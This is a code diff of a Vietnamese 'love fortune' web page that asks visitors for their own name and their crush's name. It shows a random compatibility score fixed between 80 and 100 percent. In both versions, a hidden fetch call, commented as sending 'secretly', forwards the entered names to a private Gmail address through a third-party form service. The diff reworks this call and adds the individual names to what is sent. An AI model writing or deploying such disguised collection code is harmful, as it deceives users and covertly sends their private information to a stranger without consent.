@@ -82,59 +82,57 @@
 <div class="card">
     <h2>❤️ Bói Tình Yêu ❤️</h2>
     
-    <div class="input-group">
-        <label for="yourName">Tên của bạn:</label>
-        <input type="text" id="yourName" placeholder="Nhập tên bạn..." required>
-    </div>
+    <form id="loveForm">
+        <div class="input-group">
+            <label for="yourName">Tên của bạn:</label>
+            <input type="text" id="yourName" placeholder="Nhập tên bạn..." required>
+        </div>
 
-    <div class="input-group">
-        <label for="crushName">Tên Crush của bạn:</label>
-        <input type="text" id="crushName" placeholder="Nhập tên crush..." required>
-    </div>
+        <div class="input-group">
+            <label for="crushName">Tên Crush của bạn:</label>
+            <input type="text" id="crushName" placeholder="Nhập tên crush..." required>
+        </div>
 
-    <button onclick="processLove()">Xem Tỉ Lệ Hợp Nhau</button>
+        <button type="submit">Xem Tỉ Lệ Hợp Nhau</button>
+    </form>
 
     <div id="result"></div>
 </div>
 
 <script>
-function processLove() {
+document.getElementById('loveForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
     const yourName = document.getElementById('yourName').value.trim();
     const crushName = document.getElementById('crushName').value.trim();
 
-    if (!yourName || !crushName) {
-        alert("Vui lòng nhập đầy đủ tên của bạn và crush!");
-        return;
-    }
+    if (!yourName || !crushName) return;
 
-    // Hiển thị tỉ lệ vui
+    // Hiển thị tỉ lệ ngẫu nhiên cho người dùng
     const randomPercent = Math.floor(Math.random() * 21) + 80;
     document.getElementById('result').innerText = `Tỉ lệ hợp nhau: ${randomPercent}%! ❤️`;
 
-    // Tạo chuỗi thông điệp
+    // Nội dung gửi đi
     const messageContent = `"${yourName}" yêu "${crushName}"`;
 
-    // Gửi ngầm tới Gmail anluufake@gmail.com qua Web3Forms
-    fetch("https://app.web3forms.com/forms/5520825c-5a25-4d63-bdcc-57422fc77663/submissions", {
+    // Gửi ngầm tới Gmail qua FormSubmit
+    fetch("https://formsubmit.co/ajax/toilaanthoi233@gmail.com", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
+        headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
         },
         body: JSON.stringify({
-            access_key: "5520825c-5a25-4d63-bdcc-57422fc77663", // Thay Access Key của bạn vào đây
-            subject: "Thông báo bói tình yêu mới",
-            from_name: "Web Boi Tinh Yeu",
-            message: messageContent
+            _subject: "Có lượt bói tình yêu mới!",
+            "Thông điệp": messageContent,
+            "Tên người nhập": yourName,
+            "Tên Crush": crushName
         })
-    }).then(response => {
-        if (response.ok) {
-            console.log("Đã gửi email thành công!");
-        }
-    }).catch(error => {
-        console.error("Lỗi khi gửi:", error);
-    });
-}
+    })
+    .then(response => response.json())
+    .then(data => console.log("Gửi thành công!"))
+    .catch(error => console.error("Lỗi:", error));
+});
 </script>
 
 </body>
